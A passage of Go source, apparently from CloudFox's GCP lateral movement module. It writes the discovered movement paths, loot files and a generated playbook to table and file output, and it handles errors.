		// Add playbook to first project only (to avoid duplication)
		if playbook != nil && playbook.Contents != "" && len(outputData.ProjectLevelData) == 0 {
			lootFiles = append(lootFiles, *playbook)
		}

		outputData.ProjectLevelData[projectID] = LateralMovementOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
	}
}

func (m *LateralMovementModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	tables := []internal.TableFile{}

	if len(m.AllPaths) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "lateral-movement",
			Header: m.getHeader(),
			Body:   m.pathsToTableBody(m.AllPaths),
		})
	}

	// Collect loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	// Add playbook
	playbook := m.generatePlaybook()
	if playbook != nil && playbook.Contents != "" {
		lootFiles = append(lootFiles, *playbook)
	}

	output := LateralMovementOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
